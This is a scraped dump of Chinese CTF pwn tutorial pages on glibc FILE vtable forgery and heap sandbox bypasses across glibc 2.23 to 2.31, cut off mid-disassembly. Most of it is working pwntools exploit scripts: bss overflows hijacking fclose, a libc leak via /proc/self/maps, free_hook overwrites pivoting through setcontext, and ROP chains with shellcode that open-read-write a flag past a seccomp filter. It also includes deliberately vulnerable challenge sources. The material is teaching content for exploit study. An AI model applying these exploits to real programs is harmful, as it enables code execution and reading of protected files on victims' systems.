"},"pwn/FILE_related/vtable伪造/vtable伪造.html":{"url":"pwn/FILE_related/vtable伪造/vtable伪造.html","title":"vtable伪造","keywords":"","body":"vtable伪造 ​ libc2.23 版本下，位于 libc 数据段的 vtable 是不可以进行写入的，在之前的版本的利用就不叙述了。虽然libc 数据段的 vtable不可以写入，但是可以通过伪造vtable并且修改_IO_FILE_plus->vtable这个指针来实现劫持程序流程。 直接用wiki上的例子 #define system_ptr 0x7ffff7a523a0; #include #include #include int main(void) { FILE *fp; long long *vtable_addr,*fake_vtable; fp=fopen(\"123.txt\",\"rw\"); fake_vtable=malloc(0x40); vtable_addr=(long long *)((long long)fp+0xd8); //vtable offset vtable_addr[0]=(long long)fake_vtable; memcpy(fp,\"sh\",3); fake_vtable[7]=system_ptr; //xsputn fwrite(\"hi\",2,1,fp); } vtable 中的函数调用时会把对应的_IO_FILE_plus 指针作为第一个参数传递，也就是_flags成员变量。 这里伪造fp的vtable指针，使其指向我们伪造好的区域，fwrite会调用_IO_jump_t中偏移为0x38的指针（__xsputn），让它指向system函数，而fp->_flags上直接放“sh”字符串。运行fwrite时实际上去执行system(\"sh\")。（gdb调试运行，不可直接运行，要不然system的地址不正确） 注：stdin\\stdout\\stderr这些_IO_FILE_plus结构体变量也是可以被修改的，这些流在 printf\\scanf 等函数中就会被使用到。在 libc2.23 之前，这些 vtable 是可以写入并且不存在其他检测的。 例1 源码如下example.c #include #include char buf1[0x20]={0}; //0x601080 FILE *fp=NULL; //0x6010a0 char buf2[0x400]={0}; //0x6010c0 void backdoor(){ system(\"no sh\"); } int main(){ fp = fopen(\"key.txt\",\"rw\"); gets(buf1); fclose(fp); } 编译命令 $ gcc -g example.c -o example -no-pie 明显的溢出，不过是在bss段，可以覆盖fp指针和buf2，此处把伪造的file结构体和vtable结构体分别放在buf2上和buf2+0x200上。 file结构体需要伪造的地方 1，_flags 修改为\"/bin/sh\" 作为vtable调用时的第一个参数 2，_lock _IO_acquire_lock，此处存在一个对_lock的调用，而_lock是一个指针，指向一个结构体_IO_lock_t，这里只需要让这个指针指向一个合法的地址，并且0x18个字节内的值全是‘\\x00’即可。 typedef struct { int lock; int cnt; void *owner; } _IO_lock_t; 3，vtable指向我们伪造的vtable结构 vtable中需要构造的地方 1，__close 这里改成我们需要执行的地方(system_plt) 寻找方法：可以用peda的pattern create 寻找 漏洞触发方式：执行fclose时，调用了vtable上的__close（被伪造位system_plt的地址） 最终exp from pwn import* context.log_level = 'debug' p = process('./example') elf = ELF('./example') system = elf.plt['system'] buf2 = 0x6010c0 fake_vtable_ptr = buf2+0x200 fake_file = '/bin/sh\\x00'.ljust(0x88,'\\x00')+p64(buf2+0x400) fake_file = fake_file.ljust(0xd8,'\\x00')+p64(fake_vtable_ptr) fake_vtable = '\\x00'*0x88+p64(system) payload = 'a'*0x20+p64(buf2)+p64(0)*3 payload += fake_file.ljust(0x200,'\\x00') payload += fake_vtable #gdb.attach(p,'b *0x40063a') p.sendline(payload) p.interactive() 例2 pwnable.tw上的seethefile 附件下载（可能被墙）：https://pwnable.tw/static/chall/seethefile 32位程序，攻击方法和例1一样，只是各个结构体成员的偏移量不一样而已。 main函数伪代码 int __cdecl main(int argc, const char **argv, const char **envp) { char nptr; // [esp+Ch] [ebp-2Ch] unsigned int v4; // [esp+2Ch] [ebp-Ch] v4 = __readgsdword(0x14u); init(); welcome(); while ( 1 ) { menu(); __isoc99_scanf(\"%s\", &nptr); switch ( atoi(&nptr) ) { case 1: openfile(); break; case 2: readfile(); break; case 3: writefile(); break; case 4: closefile(); break; case 5: printf(\"Leave your name :\"); __isoc99_scanf(\"%s\", &name); printf(\"Thank you %s ,see you next time\\n\", &name); if ( fp ) fclose(fp); exit(0); return; default: puts(\"Invaild choice\"); exit(0); return; } } } 主要功能： 1）openfile：打开文件，文件指针就是fp，不能打开文件名为flag的文件 2）readfile：从fp读取0x18F个字节到magicbuf上 3）closefile：关闭文件，指针fp赋0 4）writefile：只是一个打印函数，而不能写入，不能打印flag,FLAG,}名的文件 case 5处有明显的溢出，可以覆盖fp指针。 相对来说比较新颖的是，这里libc的获取 由于linux独特的文件形式存储，文件的内存信息存储与/proc/pid/maps中，这里pid使用self来代替。 参考文章 http://p4nda.top/2017/09/20/pwnable-tw-seethefile/ 利用这里利用方法和例1一致就不再赘述，直接上exp from pwn import* context.log_level = 'debug' context.update(arch='amd64',os='linux',timeout=1) p = process('./seethefile') #p = remote('',) libc = ELF('/lib/i386-linux-gnu/libc.so.6') def pr(a,addr): log.success(a+'===>'+hex(addr)) def openfile(name): p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('to see :') p.sendline(name) def readfile(): p.recvuntil('Your choice :') p.sendline('2') def writefile(): p.recvuntil('Your choice :') p.sendline('3') def closefile(): p.recvuntil('Your choice :') p.sendline('4') def exit(name): p.recvuntil('Your choice :') p.sendline('5') p.recvuntil('your name :') p.sendline(name) name_addr = 0x804b260 openfile('/proc/self/maps') readfile() writefile() readfile() writefile() p.recvuntil('f7') libcbase = int('0xf7'+p.recv(6),16)+0x1000 system = libcbase + libc.sym['system'] pr('libcbase',libcbase) pr('system',system) #gdb.attach(p,'b *0x8048B0F') fake_file = ('sh'+'\\x00'*2).ljust(0x48,'\\x00')+p32(0x804b500) fake_file = fake_file.ljust(0x94,'\\x00')+p32(name_addr+0x20+0x94+4) fake_vtable = '\\x00'*64 + p32(system) payload = 'a'*0x20 + p32(0x0804B284) + fake_file + fake_vtable exit(payload) p.interactive() "},"pwn/沙箱/":{"url":"pwn/沙箱/","title":"沙箱","keywords":"","body":""},"pwn/沙箱/glibc2.27下堆题绕过沙箱/glibc2.27下堆题绕过沙箱.html":{"url":"pwn/沙箱/glibc2.27下堆题绕过沙箱/glibc2.27下堆题绕过沙箱.html","title":"glibc2.27下堆题绕过沙箱","keywords":"","body":"这里因为重点在于沙箱的绕过，漏洞就拿了一个最简单的uaf做演示。 最主要的是setcontext这个函数，可以看到setcontext+53之后控制了大量的寄存器（可以看作就是一个SigreturnFrame），寻址都是[rdi+x]的方式，那么我们假如劫持了free_hook为setcontext+53，此时rdi刚好是堆块内容的地址，我们可以直接放个SigreturnFrame进去，之后利用的话就按个人喜好了。我写了三种方式，本质都是orw。 1.mprotect+shellcode 2.rop（rop地址在free_hook附近） 3.rop（rop地址在heap上） setcontext的汇编 0x7ffff7a34180 : push rdi 0x7ffff7a34181 : lea rsi,[rdi+0x128] 0x7ffff7a34188 : xor edx,edx 0x7ffff7a3418a : mov edi,0x2 0x7ffff7a3418f : mov r10d,0x8 0x7ffff7a34195 : mov eax,0xe 0x7ffff7a3419a : syscall 0x7ffff7a3419c : pop rdi 0x7ffff7a3419d : cmp rax,0xfffffffffffff001 0x7ffff7a341a3 : jae 0x7ffff7a34200 0x7ffff7a341a5 : mov rcx,QWORD PTR [rdi+0xe0] 0x7ffff7a341ac : fldenv [rcx] 0x7ffff7a341ae : ldmxcsr DWORD PTR [rdi+0x1c0] 0x7ffff7a341b5 : mov rsp,QWORD PTR [rdi+0xa0] 0x7ffff7a341bc : mov rbx,QWORD PTR [rdi+0x80] 0x7ffff7a341c3 : mov rbp,QWORD PTR [rdi+0x78] 0x7ffff7a341c7 : mov r12,QWORD PTR [rdi+0x48] 0x7ffff7a341cb : mov r13,QWORD PTR [rdi+0x50] 0x7ffff7a341cf : mov r14,QWORD PTR [rdi+0x58] 0x7ffff7a341d3 : mov r15,QWORD PTR [rdi+0x60] 0x7ffff7a341d7 : mov rcx,QWORD PTR [rdi+0xa8] 0x7ffff7a341de : push rcx 0x7ffff7a341df : mov rsi,QWORD PTR [rdi+0x70] 0x7ffff7a341e3 : mov rdx,QWORD PTR [rdi+0x88] 0x7ffff7a341ea : mov rcx,QWORD PTR [rdi+0x98] 0x7ffff7a341f1 : mov r8,QWORD PTR [rdi+0x28] 0x7ffff7a341f5 : mov r9,QWORD PTR [rdi+0x30] 0x7ffff7a341f9 : mov rdi,QWORD PTR [rdi+0x68] 0x7ffff7a341fd : xor eax,eax 0x7ffff7a341ff : ret 0x7ffff7a34200 : mov rcx,QWORD PTR [rip+0x398c61] # 0x7ffff7dcce68 0x7ffff7a34207 : neg eax 0x7ffff7a34209 : mov DWORD PTR fs:[rcx],eax 0x7ffff7a3420c : or rax,0xffffffffffffffff 0x7ffff7a34210 : ret 题目源码test.c gcc -o test test.c #include #include #include #include #include #include int Nodes_len[0x10]; char *Nodes[0x10]; int count=0; int get_atoi() { char buf[8]; read(0,buf,8); return atoi(buf); } void sandbox(){ struct sock_filter filter[] = { BPF_STMT(BPF_LD+BPF_W+BPF_ABS,4), BPF_JUMP(BPF_JMP+BPF_JEQ,0xc000003e,0,2), BPF_STMT(BPF_LD+BPF_W+BPF_ABS,0), BPF_JUMP(BPF_JMP+BPF_JEQ,59,0,1), BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL), BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW), }; struct sock_fprog prog = { .len = (unsigned short)(sizeof(filter)/sizeof(filter[0])), .filter = filter, }; prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0); prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&prog); } void add(){ int len; printf(\"len:\"); scanf(\"%d\",&len); if(len0xfff) exit(0); if(count>0x10){ puts(\"too many\"); exit(0); } Nodes[count] = malloc(len); Nodes_len[count] = len; count++; puts(\"done!\"); } void del(){ int idx; printf(\"idx:\"); scanf(\"%d\",&idx); if(idx>count){ puts(\"error!\"); exit(0); } free(Nodes[idx]); puts(\"done!\"); } void edit(){ int idx; printf(\"idx:\"); scanf(\"%d\",&idx); if(idx>count){ puts(\"error!\"); exit(0); } read(0,Nodes[idx],Nodes_len[idx]); puts(\"done!\"); } void show(){ int idx; printf(\"idx:\"); scanf(\"%d\",&idx); if(idx>count){ puts(\"error!\"); exit(0); } write(1,Nodes[idx],Nodes_len[idx]); } void gift(){ printf(\"heap_base:%p\\n\",Nodes[0]); } void menu(){ puts(\"1.add\"); puts(\"2.delete\"); puts(\"3.edit\"); puts(\"4.show\"); puts(\"5.gift\"); puts(\"6.exit\"); printf(\"choice:\"); } void init() { setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); } int main(){ init(); sandbox(); while(1){ int choice; menu(); choice = get_atoi(); switch(choice){ case 1: add(); break; case 2: del(); break; case 3: edit(); break; case 4: show(); break; case 5: gift(); break; default: puts(\"invalued input!\"); exit(0); } } return 0; } 方法一 mprotect+shellcode from pwn import* context.log_level = 'debug' p = process('./test') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') elf = ELF('./test') context.arch = elf.arch def pr(a,addr): log.success(a+'====>'+hex(addr)) def add(length): p.sendlineafter(':','1') p.sendlineafter('len:',str(length)) def delete(idx): p.sendlineafter(':','2') p.sendlineafter('idx:',str(idx)) def edit(idx,ct): p.sendlineafter(':','3') p.sendlineafter('idx:',str(idx)) p.send(ct) def show(idx): p.sendlineafter(':','4') p.sendlineafter('idx:',str(idx)) add(0x500) #0 add(0x10) #1 delete(0) show(0) leak = u64(p.recv(6)+'\\x00'*2) libcbase = leak - (0x7f3490493ca0-0x7f34900a8000) setcontext_door = libcbase + libc.sym['setcontext']+53 free_hook = libcbase + libc.sym['__free_hook'] syscall = libcbase +0xd2745 pr('libcbase',libcbase) delete(1) edit(1,p64(free_hook)) add(0x10)#2 add(0x10)#3 edit(3,p64(setcontext_door)) #=========================setcontext=========================== fake_rsp = free_hook&0xfffffffffffff000 frame = SigreturnFrame() frame.rax=0 frame.rdi=0 frame.rsi=fake_rsp frame.rdx=0x2000 frame.rsp=fake_rsp frame.rip=syscall add(0x100) #4 edit(4,str(frame)) #gdb.attach(p,'b *'+str(setcontext_door)) delete(4) #==========================orw================================= prdi_ret = libcbase+libc.search(asm(\"pop rdi\\nret\")).next() prsi_ret = libcbase+libc.search(asm(\"pop rsi\\nret\")).next() prdx_ret = libcbase+libc.search(asm(\"pop rdx\\nret\")).next() prax_ret = libcbase+libc.search(asm(\"pop rax\\nret\")).next() jmp_rsp = libcbase+libc.search(asm(\"jmp rsp\")).next() mprotect_addr = libcbase + libc.sym['mprotect'] payload = p64(prdi_ret)+p64(fake_rsp) payload += p64(prsi_ret)+p64(0x1000) payload += p64(prdx_ret)+p64(7) payload += p64(prax_ret)+p64(10) payload += p64(syscall) #mprotect(fake_rsp,0x1000,7) payload += p64(jmp_rsp) payload += asm(shellcraft.open('flag')) payload += asm(shellcraft.read(3,fake_rsp+0x300,0x30)) payload += asm(shellcraft.write(1,fake_rsp+0x300,0x30)) p.send(payload) #pause() p.interactive() 方法二 rop（rop地址在free_hook附近） from pwn import* context.log_level = 'debug' p = process('./test') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') elf = ELF('./test') context.arch = elf.arch def pr(a,addr): log.success(a+'====>'+hex(addr)) def add(length): p.sendlineafter(':','1') p.sendlineafter('len:',str(length)) def delete(idx): p.sendlineafter(':','2') p.sendlineafter('idx:',str(idx)) def edit(idx,ct): p.sendlineafter(':','3') p.sendlineafter('idx:',str(idx)) p.send(ct) def show(idx): p.sendlineafter(':','4') p.sendlineafter('idx:',str(idx)) add(0x500) #0 add(0x10) #1 delete(0) show(0) leak = u64(p.recv(6)+'\\x00'*2) libcbase = leak - (0x7f3490493ca0-0x7f34900a8000) setcontext_door = libcbase + libc.sym['setcontext']+53 free_hook = libcbase + libc.sym['__free_hook'] syscall = libcbase +0xd2745 pr('libcbase',libcbase) delete(1) edit(1,p64(free_hook)) add(0x10)#2 add(0x10)#3 edit(3,p64(setcontext_door)) #=========================setcontext=========================== frame = SigreturnFrame() frame.rax=0 frame.rdi=0 frame.rsi=free_hook&0xfffffffffffff000 frame.rdx=0x2000 frame.rsp=free_hook&0xfffffffffffff000 frame.rip=syscall add(0x100) #4 edit(4,str(frame)) #gdb.attach(p,'b *'+str(setcontext_door)) delete(4) #==========================orw================================= prdi_ret = libcbase+libc.search(asm(\"pop rdi\\nret\")).next() prsi_ret = libcbase+libc.search(asm(\"pop rsi\\nret\")).next() prdx_ret = libcbase+libc.search(asm(\"pop rdx\\nret\")).next() def ropchain(function,arg1,arg2,arg3): ret = p64(prdi_ret)+p64(arg1) ret += p64(prsi_ret)+p64(arg2) ret += p64(prdx_ret)+p64(arg3) ret += p64(function) return ret read_addr = libcbase + libc.sym['read'] open_addr = libcbase + libc.sym['open'] write_addr = libcbase + libc.sym['write'] flag_string_addr = (free_hook&0xfffffffffffff000)+0x200 payload = ropchain(read_addr,0,flag_string_addr,0x10) payload += ropchain(open_addr,flag_string_addr,0,0) payload += ropchain(read_addr,3,flag_string_addr,0x30) payload += ropchain(write_addr,1,flag_string_addr,0x30) p.send(payload) pause() p.send('./flag') p.interactive() 方法三（需要泄露堆地址） rop（rop地址在heap上） from pwn import* context.log_level = 'debug' p = process('./test') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') elf = ELF('./test') context.arch = elf.arch def pr(a,addr): log.success(a+'====>'+hex(addr)) def add(length): p.sendlineafter(':','1') p.sendlineafter('len:',str(length)) def delete(idx): p.sendlineafter(':','2') p.sendlineafter('idx:',str(idx)) def edit(idx,ct): p.sendlineafter(':','3') p.sendlineafter('idx:',str(idx)) p.send(ct) def show(idx): p.sendlineafter(':','4') p.sendlineafter('idx:',str(idx)) add(0x500) #0 add(0x10) #1 delete(0) show(0) leak = u64(p.recv(6)+'\\x00'*2) p.sendlineafter(':','5') p.recvuntil('heap_base:') heapbase = int(p.recvuntil('\\n')[:-1],16)-0x260 libcbase = leak - (0x7f3490493ca0-0x7f34900a8000) setcontext_door = libcbase + libc.sym['setcontext']+53 free_hook = libcbase + libc.sym['__free_hook'] syscall = libcbase +0xd2745 pr('libcbase',libcbase) pr('heapbase',heapbase) delete(1) edit(1,p64(free_hook)) add(0x10)#2 add(0x10)#3 edit(3,p64(setcontext_door)) #=========================setcontext=========================== prdi_ret = libcbase+libc.search(asm(\"pop rdi\\nret\")).next() prsi_ret = libcbase+libc.search(asm(\"pop rsi\\nret\")).next() prdx_ret = libcbase+libc.search(asm(\"pop rdx\\nret\")).next() def ropchain(function,arg1,arg2,arg3): ret = p64(prdi_ret)+p64(arg1) ret += p64(prsi_ret)+p64(arg2) ret += p64(prdx_ret)+p64(arg3) ret += p64(function) return ret read_addr = libcbase + libc.sym['read'] open_addr = libcbase + libc.sym['open'] write_addr = libcbase + libc.sym['write'] context_addr = heapbase + 0x260 flag_string_addr = context_addr + 0x200 frame = SigreturnFrame() frame.rsp = context_addr+0xf8 frame.rip = libcbase+libc.search(asm(\"ret\")).next() payload = str(frame) payload += ropchain(open_addr,flag_string_addr,0,0) payload += ropchain(read_addr,3,flag_string_addr,0x30) payload += ropchain(write_addr,1,flag_string_addr,0x30) payload = payload.ljust(0x200,'\\x00')+'./flag\\x00' add(0x300) #4 edit(4,payload) #gdb.attach(p,'b *'+str(setcontext_door)) delete(4) p.interactive() 参考文章 https://blog.csdn.net/carol2358/article/details/108351308?spm=1001.2014.3001.5506 "},"pwn/沙箱/glibc2.29下堆题绕过沙箱/glibc2.29下堆题绕过沙箱.html":{"url":"pwn/沙箱/glibc2.29下堆题绕过沙箱/glibc2.29下堆题绕过沙箱.html","title":"glibc2.29下堆题绕过沙箱","keywords":"","body":"glibc2.29下堆题绕过沙箱 还是用相同的题目 gcc -o test test.c #include #include #include #include #include #include int Nodes_len[0x10]; char *Nodes[0x10]; int count=0; int get_atoi() { char buf[8]; read(0,buf,8); return atoi(buf); } void sandbox(){ struct sock_filter filter[] = { BPF_STMT(BPF_LD+BPF_W+BPF_ABS,4), BPF_JUMP(BPF_JMP+BPF_JEQ,0xc000003e,0,2), BPF_STMT(BPF_LD+BPF_W+BPF_ABS,0), BPF_JUMP(BPF_JMP+BPF_JEQ,59,0,1), BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL), BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW), }; struct sock_fprog prog = { .len = (unsigned short)(sizeof(filter)/sizeof(filter[0])), .filter = filter, }; prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0); prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&prog); } void add(){ int len; printf(\"len:\"); scanf(\"%d\",&len); if(len0xfff) exit(0); if(count>0x10){ puts(\"too many\"); exit(0); } Nodes[count] = malloc(len); Nodes_len[count] = len; count++; puts(\"done!\"); } void del(){ int idx; printf(\"idx:\"); scanf(\"%d\",&idx); if(idx>count){ puts(\"error!\"); exit(0); } free(Nodes[idx]); puts(\"done!\"); } void edit(){ int idx; printf(\"idx:\"); scanf(\"%d\",&idx); if(idx>count){ puts(\"error!\"); exit(0); } read(0,Nodes[idx],Nodes_len[idx]); puts(\"done!\"); } void show(){ int idx; printf(\"idx:\"); scanf(\"%d\",&idx); if(idx>count){ puts(\"error!\"); exit(0); } write(1,Nodes[idx],Nodes_len[idx]); } void gift(){ printf(\"heap_base:%p\\n\",Nodes[0]); } void menu(){ puts(\"1.add\"); puts(\"2.delete\"); puts(\"3.edit\"); puts(\"4.show\"); puts(\"5.gift\"); puts(\"6.exit\"); printf(\"choice:\"); } void init() { setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); } int main(){ init(); sandbox(); while(1){ int choice; menu(); choice = get_atoi(); switch(choice){ case 1: add(); break; case 2: del(); break; case 3: edit(); break; case 4: show(); break; case 5: gift(); break; default: puts(\"invalued input!\"); exit(0); } } return 0; } 方法一 2.29之后setcontext有所改变，参数传递由rdi变成了rdx，所以需要控制rdx寄存器指向SigreturnFrame。 这里用到了一条神奇的gadgets mov rdx, qword ptr [rdi + 8]; mov rax, qword ptr [rdi]; mov rdi, rdx; jmp rax; 思路： 把free_hook指向这个gadgets，之后利用思路和之前类似 exp1 rop链写在堆上 from pwn import* context.log_level = 'debug' p = process('./a.out') libc = ELF('/home/tty18pwn/Desktop/glibc-all-in-one-master/libs/2.29-0ubuntu2_amd64/libc-2.29.so') elf = ELF('./a.out') context.arch = 'amd64' def pr(a,addr): log.success(a+'====>'+hex(addr)) def add(length): p.sendlineafter(':','1') p.sendlineafter('len:',str(length)) def delete(idx): p.sendlineafter(':','2') p.sendlineafter('idx:',str(idx)) def edit(idx,ct): p.sendlineafter(':','3') p.sendlineafter('idx:',str(idx)) p.send(ct) def show(idx): p.sendlineafter(':','4') p.sendlineafter('idx:',str(idx)) add(0x500) #0 add(0x10) #1 delete(0) show(0) leak = u64(p.recv(6)+'\\x00'*2) p.sendlineafter(':','5') p.recvuntil('heap_base:') heapbase = int(p.recvuntil('\\n')[:-1],16)-0x260 libcbase = leak - (0x7fb553f5cca0-0x00007fb553d78000) free_hook = libcbase + libc.sym['__free_hook'] pr('libcbase',libcbase) pr('heapbase',heapbase) gadgets = libcbase + 0x000000000012be97 setcontext_door = libcbase + libc.sym['setcontext']+53 delete(1) edit(1,p64(free_hook)) add(0x10)#2 add(0x10)#3 edit(3,p64(gadgets)) #=============================================== prdi_ret = libcbase+0x0000000000026542 prsi_ret = libcbase+0x0000000000026f9e prdx_ret = libcbase+0x000000000012bda6 ret = libcbase+libc.search(asm(\"ret\")).next() def ropchain(function,arg1,arg2,arg3): ret = p64(prdi_ret)+p64(arg1) ret += p64(prsi_ret)+p64(arg2) ret += p64(prdx_ret)+p64(arg3) ret += p64(function) return ret read_addr = libcbase + libc.sym['read'] open_addr = libcbase + libc.sym['open'] write_addr = libcbase + libc.sym['write'] rop_addr = heapbase + 0x260+0x100 flag_string_addr = rop_addr + 0x200 payload = ropchain(open_addr,flag_string_addr,0,0) payload += ropchain(read_addr,3,flag_string_addr,0x30) payload += ropchain(write_addr,1,flag_string_addr,0x30) payload = payload.ljust(0x200,'\\x00')+'./flag\\x00' #=========================setcontext=========================== frame = SigreturnFrame() frame.rsi=rop_addr frame.rsp=rop_addr frame.rip=libcbase + libc.sym['setcontext']+127 add(0x500) #4 edit(4,p64(setcontext_door)+p64(heapbase+0x260)+str(frame).ljust(0x100,'\\x00')[0x10:]+payload) #gdb.attach(p,'b *'+str(gadgets)) #pause() delete(4) p.interactive() exp2 rop链写在free_hook附近 from pwn import* context.log_level = 'debug' p = process('./a.out') libc = ELF('/home/tty18pwn/Desktop/glibc-all-in-one-master/libs/2.29-0ubuntu2_amd64/libc-2.29.so') elf = ELF('./a.out') context.arch = 'amd64' def pr(a,addr): log.success(a+'====>'+hex(addr)) def add(length): p.sendlineafter(':','1') p.sendlineafter('len:',str(length)) def delete(idx): p.sendlineafter(':','2') p.sendlineafter('idx:',str(idx)) def edit(idx,ct): p.sendlineafter(':','3') p.sendlineafter('idx:',str(idx)) p.send(ct) def show(idx): p.sendlineafter(':','4') p.sendlineafter('idx:',str(idx)) add(0x500) #0 add(0x10) #1 delete(0) show(0) leak = u64(p.recv(6)+'\\x00'*2) p.sendlineafter(':','5') p.recvuntil('heap_base:') heapbase = int(p.recvuntil('\\n')[:-1],16)-0x260 libcbase = leak - (0x7fb553f5cca0-0x00007fb553d78000) free_hook = libcbase + libc.sym['__free_hook'] pr('libcbase',libcbase) pr('heapbase',heapbase) gadgets = libcbase + 0x000000000012be97 setcontext_door = libcbase + libc.sym['setcontext']+53 delete(1) edit(1,p64(free_hook)) add(0x10)#2 add(0x10)#3 edit(3,p64(gadgets)) #=========================setcontext=========================== rop_addr = free_hook & 0xffffffffffffffff frame = SigreturnFrame() frame.rax=0 frame.rdi=0 frame.rsi=rop_addr frame.rdx=0x300 frame.rsp=rop_addr frame.rip= libcbase+0xcf6c5#syscall;ret; #=============================================== prdi_ret = libcbase+0x0000000000026542 prsi_ret = libcbase+0x0000000000026f9e prdx_ret = libcbase+0x000000000012bda6 ret = libcbase+libc.search(asm(\"ret\")).next() def ropchain(function,arg1,arg2,arg3): ret = p64(prdi_ret)+p64(arg1) ret += p64(prsi_ret)+p64(arg2) ret += p64(prdx_ret)+p64(arg3) ret += p64(function) return ret read_addr = libcbase + libc.sym['read'] open_addr = libcbase + libc.sym['open'] write_addr = libcbase + libc.sym['write'] flag_string_addr = rop_addr + 0x200 payload = ropchain(open_addr,flag_string_addr,0,0) payload += ropchain(read_addr,3,flag_string_addr,0x30) payload += ropchain(write_addr,1,flag_string_addr,0x30) payload = payload.ljust(0x200,'\\x00')+'./flag\\x00' add(0x500) #4 edit(4,p64(setcontext_door)+p64(heapbase+0x260)+str(frame).ljust(0x100,'\\x00')[0x10:]) #gdb.attach(p,'b *'+str(gadgets)) delete(4) pause() p.send(payload) p.interactive() "},"pwn/沙箱/glibc2.31下堆题绕过沙箱/glibc2.31下堆题绕过沙箱.html":{"url":"pwn/沙箱/glibc2.31下堆题绕过沙箱/glibc2.31下堆题绕过沙箱.html","title":"glibc2.31下堆题绕过沙箱","keywords":"","body":"glibc2.31下堆题绕过沙箱 还是用相同的题目 gcc -o test test.c #include #include #include #include #include #include int Nodes_len[0x10]; char *Nodes[0x10]; int count=0; int get_atoi() { char buf[8]; read(0,buf,8); return atoi(buf); } void sandbox(){ struct sock_filter filter[] = { BPF_STMT(BPF_LD+BPF_W+BPF_ABS,4), BPF_JUMP(BPF_JMP+BPF_JEQ,0xc000003e,0,2), BPF_STMT(BPF_LD+BPF_W+BPF_ABS,0), BPF_JUMP(BPF_JMP+BPF_JEQ,59,0,1), BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL), BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW), }; struct sock_fprog prog = { .len = (unsigned short)(sizeof(filter)/sizeof(filter[0])), .filter = filter, }; prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0); prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&prog); } void add(){ int len; printf(\"len:\"); scanf(\"%d\",&len); if(len0xfff) exit(0); if(count>0x10){ puts(\"too many\"); exit(0); } Nodes[count] = malloc(len); Nodes_len[count] = len; count++; puts(\"done!\"); } void del(){ int idx; printf(\"idx:\"); scanf(\"%d\",&idx); if(idx>count){ puts(\"error!\"); exit(0); } free(Nodes[idx]); puts(\"done!\"); } void edit(){ int idx; printf(\"idx:\"); scanf(\"%d\",&idx); if(idx>count){ puts(\"error!\"); exit(0); } read(0,Nodes[idx],Nodes_len[idx]); puts(\"done!\"); } void show(){ int idx; printf(\"idx:\"); scanf(\"%d\",&idx); if(idx>count){ puts(\"error!\"); exit(0); } write(1,Nodes[idx],Nodes_len[idx]); } void gift(){ printf(\"heap_base:%p\\n\",Nodes[0]); } void menu(){ puts(\"1.add\"); puts(\"2.delete\"); puts(\"3.edit\"); puts(\"4.show\"); puts(\"5.gift\"); puts(\"6.exit\"); printf(\"choice:\"); } void init() { setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); } int main(){ init(); sandbox(); while(1){ int choice; menu(); choice = get_atoi(); switch(choice){ case 1: add(); break; case 2: del(); break; case 3: edit(); break; case 4: show(); break; case 5: gift(); break; default: puts(\"invalued input!\"); exit(0); } } return 0; } 方法一 2.31下和2.29下情况差不多，不过用的gadgets有所改变 gadgets变成下面这条 mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]; setcontext又发生了细微的变化，但对利用而言没啥变化，就是偏移变了，变成了setcontext+61。 0x7ffff7e1a0a0 : endbr64 0x7ffff7e1a0a4 : push rdi 0x7ffff7e1a0a5 : lea rsi,[rdi+0x128] 0x7ffff7e1a0ac : xor edx,edx 0x7ffff7e1a0ae : mov edi,0x2 0x7ffff7e1a0b3 : mov r10d,0x8 0x7ffff7e1a0b9 : mov eax,0xe 0x7ffff7e1a0be : syscall 0x7ffff7e1a0c0 : pop rdx 0x7ffff7e1a0c1 : cmp rax,0xfffffffffffff001 0x7ffff7e1a0c7 : jae 0x7ffff7e1a1ef 0x7ffff7e1a0cd : mov rcx,QWORD PTR [rdx+0xe0] 0x7ffff7e1a0d4 : fldenv [rcx] 0x7ffff7e1a0d6 : ldmxcsr DWORD PTR [rdx+0x1c0] 0x7ffff7e1a0dd : mov rsp,QWORD PTR [rdx+0xa0] 0x7ffff7e1a0e4 : mov rbx,QWORD PTR [rdx+0x80] 0x7ffff7e1a0eb : mov rbp,QWORD PTR [rdx+0x78] 0x7ffff7e1a0ef : mov r12,QWORD PTR [rdx+0x48] 0x7ffff7e1a0f3 : mov r13,QWORD PTR [rdx+0x50] 0x7ffff7e1a0f7 : mov r14,QWORD PTR [rdx+0x58] 0x7ffff7e1a0fb : mov r15,QWORD PTR [rdx+0x60] 0x7ffff7e1a0ff : test DWORD PTR fs:0x48,0x2 0x7ffff7e1a10b : je 0x7ffff7e1a1c6 0x7ffff7e1a111 : mov rsi,QWORD PTR [rdx+0x3a8] 0x7ffff7e1a118 : mov rdi,rsi 0x7ffff7e1a11b : mov rcx,QWORD PTR [rdx+0x3b0] 0x7ffff7e1a122 : cmp rcx,QWORD PTR fs:0x78 0x7ffff7e1a12b : je 0x7ffff7e1a165 0x7ffff7e1a12d : mov rax,QWORD PTR [rsi-0x8] 0x7ffff7e1a131 : and rax,0xfffffffffffffff8 0x7ffff7e1a135 : cmp rax,rsi 0x7ffff7e1a138 : je 0x7ffff7e1a140 0x7ffff7e1a13a : sub rsi,0x8 0x7ffff7e1a13e : jmp 0x7ffff7e1a12d 0x7ffff7e1a140 : mov rax,0x1 0x7ffff7e1a147 : incsspq rax 0x7ffff7e1a14c : rstorssp QWORD PTR [rsi-0x8] 0x7ffff7e1a151 : saveprevssp 0x7ffff7e1a155 : mov rax,QWORD PTR [rdx+0x3b0] 0x7ffff7e1a15c : 